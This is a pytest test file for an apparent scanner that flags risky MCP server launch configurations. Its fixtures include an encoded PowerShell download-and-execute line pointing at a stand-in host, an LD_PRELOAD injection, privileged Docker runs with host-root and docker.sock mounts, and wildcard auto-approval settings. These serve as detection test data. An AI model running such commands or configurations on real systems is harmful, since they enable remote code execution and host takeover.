import base64

import pytest

from mcp_scanner.engine import analyze
from mcp_scanner.jsonloc import from_text
from mcp_scanner.loader import load_config
from mcp_scanner.models import ServerConfig, Severity
from mcp_scanner.rules.config import analyze_launch, check_document, path_breadth


def _server(**kwargs) -> ServerConfig:
    kwargs.setdefault("name", "srv")
    kwargs.setdefault("client", "generic")
    kwargs.setdefault("transport", "stdio" if "command" in kwargs else "http")
    return ServerConfig(**kwargs)


def _rules(server: ServerConfig) -> dict[str, list]:
    out: dict[str, list] = {}
    for finding in analyze([server]):
        out.setdefault(finding.rule.id, []).append(finding)
    return out


def test_insecure_fixture(fixtures):
    result = load_config(fixtures / "configs" / "insecure.json")
    found = {(f.rule.id, f.server) for f in analyze(result.servers, [], result.documents)}
    expected = {
        ("MCPS001", None),
        ("MCPS201", "shell-chain"),
        ("MCPS202", "shell-chain"),
        ("MCPS201", "py-inline"),
        ("MCPS203", "sudo-server"),
        ("MCPS204", "filesystem"),
        ("MCPS206", "filesystem"),
        ("MCPS204", "docker-priv"),
        ("MCPS205", "docker-priv"),
        ("MCPS207", "remote-http"),
        ("MCPS302", "remote-http"),
        ("MCPS208", "tls-off"),
        ("MCPS209", "tls-off"),
        ("MCPS210", "tls-off"),
        ("MCPS302", "tls-off"),
        ("MCPS303", "tls-off"),
        ("MCPS204", "github"),
    }
    assert expected <= found


def test_benign_fixture_only_reports_wrapper_as_low(fixtures):
    result = load_config(fixtures / "configs" / "benign.json")
    findings = analyze(result.servers, [], result.documents)
    assert [(f.rule.id, f.server, f.severity) for f in findings] == [
        ("MCPS201", "windows-wrapper", Severity.LOW)
    ]


@pytest.mark.parametrize(
    ("command", "args", "base", "inline_kind"),
    [
        ("cmd", ["/c", "npx", "-y", "pkg"], "npx", "shell"),
        ("C:\\Windows\\System32\\cmd.exe", ["/s", "/c", "uvx tool"], "uvx", "shell"),
        ("bash", ["-lc", "npx -y pkg"], "npx", "shell"),
        ("bash", ["server.sh"], "bash", None),
        ("env", ["-u", "X", "A=1", "node", "s.js"], "node", None),
        ("sudo", ["-E", "/usr/bin/node", "/opt/x.js"], "node", None),
        ("runas", ["/user:admin", "node s.js"], "node", None),
        ("powershell", ["-ExecutionPolicy", "Bypass", "-Command", "npx -y pkg"], "npx", "shell"),
        ("python", ["-u", "server.py"], "python", None),
        ("python3.12", ["-m", "pkg", "-c", "cfg.yml"], "python", None),
        ("node", ["--trace-warnings", "-e", "require('x')"], "node", "code"),
    ],
)
def test_analyze_launch(command, args, base, inline_kind):
    launch = analyze_launch(command, args)
    assert launch.base == base
    assert (launch.inline.kind if launch.inline else None) == inline_kind


def test_powershell_encoded_command_is_decoded():
    payload = base64.b64encode("iwr https://x.example/a.ps1 | iex".encode("utf-16-le")).decode()
    findings = _rules(_server(command="pwsh", args=["-NoProfile", "-enc", payload]))
    (finding,) = findings["MCPS201"]
    assert "encoded" in finding.message
    assert "iwr https://x.example" in finding.evidence


@pytest.mark.parametrize(
    ("command", "args", "unpinned"),
    [
        ("npx", ["-y", "@scope/pkg"], True),
        ("npx", ["-y", "@scope/pkg@1.2.3"], False),
        ("npx", ["pkg@latest"], True),
        ("npx", ["pkg@^1.0.0"], True),
        ("npx", ["-y", "--package=pkg@2.0.0", "bin"], False),
        ("npx", ["./local-server"], False),
        ("npx", ["github:user/repo"], True),
        ("pnpm", ["dlx", "pkg@1.0.0"], False),
        ("uvx", ["mcp-server-git"], True),
        ("uvx", ["mcp-server-git==2025.1.14"], False),
        ("uvx", ["--from", "pkg==1.0.0", "tool"], False),
        ("uvx", ["pkg@latest"], True),
        ("uvx", ["pkg>=1.0"], True),
        ("uv", ["tool", "run", "pkg==1.0"], False),
        ("pipx", ["run", "--spec", "pkg==1.0", "tool"], False),
        ("pipx", ["run", "pkg"], True),
        ("docker", ["run", "-i", "--rm", "img"], True),
        ("docker", ["run", "img:latest"], True),
        ("docker", ["run", "img@sha256:" + "a" * 64], False),
        ("go", ["run", "example.com/x@latest"], True),
        ("node", ["server.js"], False),
    ],
)
def test_unpinned_packages(command, args, unpinned):
    assert ("MCPS204" in _rules(_server(command=command, args=args))) is unpinned


def test_docker_tag_without_digest_is_low():
    (finding,) = _rules(_server(command="docker", args=["run", "img:1.2"]))["MCPS204"]
    assert finding.severity == Severity.LOW


@pytest.mark.parametrize(
    ("args", "severity"),
    [
        (["run", "--privileged", "img@sha256:" + "a" * 64], Severity.HIGH),
        (["run", "-v", "/:/host", "i@sha256:" + "a" * 64], Severity.HIGH),
        (["run", "-v", "C:\\Users\\bob:/data", "i@sha256:" + "a" * 64], Severity.HIGH),
        (["run", "--mount", "type=bind,source=/var/run/docker.sock,target=/s", "i:1"],
         Severity.CRITICAL),
        (["run", "--cap-add=SYS_ADMIN", "i@sha256:" + "a" * 64], Severity.HIGH),
        (["run", "--pid", "host", "i@sha256:" + "a" * 64], Severity.HIGH),
        (["run", "-u", "root", "i@sha256:" + "a" * 64], Severity.MEDIUM),
    ],
)  # fmt: skip
def test_privileged_containers(args, severity):
    findings = _rules(_server(command="docker", args=args))["MCPS205"]
    assert max(f.severity for f in findings) == severity


def test_safe_container_has_no_container_findings():
    args = ["run", "-i", "--rm", "-v", "/home/u/proj:/work:ro", "i@sha256:" + "a" * 64]
    assert "MCPS205" not in _rules(_server(command="docker", args=args))


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("/", "root"),
        ("C:\\", "root"),
        ("D:", "root"),
        ("/home", "root"),
        ("~", "home"),
        ("~/", "home"),
        ("$HOME", "home"),
        ("%USERPROFILE%", "home"),
        ("/home/alice", "home"),
        ("/Users/bob/", "home"),
        ("C:\\Users\\bob", "home"),
        ("/home/alice/projects", None),
        ("./data", None),
        ("--verbose", None),
    ],
)
def test_path_breadth(value, expected):
    assert path_breadth(value) == expected


def test_broad_filesystem_with_flag_value():
    findings = _rules(_server(command="mcp-fs", args=["--root=/"]))["MCPS206"]
    assert findings[0].severity == Severity.HIGH


def test_transport_rules():
    assert "MCPS207" in _rules(_server(url="http://10.0.0.5/mcp"))
    assert "MCPS207" not in _rules(_server(url="http://localhost:3000/mcp"))
    assert "MCPS207" not in _rules(_server(url="http://[::1]:3000/mcp"))
    assert "MCPS207" not in _rules(_server(url="https://example.com/mcp"))
    remote = _rules(_server(command="npx", args=["mcp-remote@1.0.0", "http://example.com/sse"]))
    assert remote["MCPS207"][0].severity == Severity.MEDIUM


def test_tls_and_env_injection():
    findings = _rules(
        _server(
            command="node",
            args=["s.js"],
            env={
                "SSL_VERIFY": "false",
                "LD_PRELOAD": "/tmp/x.so",
                "NODE_OPTIONS": "--max-old-space-size=4096",
                "DYLD_LIBRARY_PATH": "/opt/lib",
            },
        )
    )
    assert len(findings["MCPS208"]) == 1
    injected = {f.field: f.severity for f in findings["MCPS210"]}
    assert injected == {"env.LD_PRELOAD": Severity.HIGH, "env.DYLD_LIBRARY_PATH": Severity.MEDIUM}


def test_auto_approval_variants():
    low_risk = _rules(_server(command="x", raw={"autoApprove": ["get_weather"]}))
    assert low_risk["MCPS209"][0].severity == Severity.MEDIUM
    wildcard = _rules(_server(command="x", raw={"alwaysAllow": ["*"]}))
    assert wildcard["MCPS209"][0].severity == Severity.HIGH
    trusted = _rules(_server(command="x", raw={"trust": True}))
    assert trusted["MCPS209"][0].severity == Severity.HIGH


def test_vscode_global_auto_approve_setting():
    doc = from_text("settings.json", '{"chat.tools.autoApprove": true}')
    (finding,) = check_document(doc)
    assert finding.rule.id == "MCPS209"
    assert finding.location.line == 1
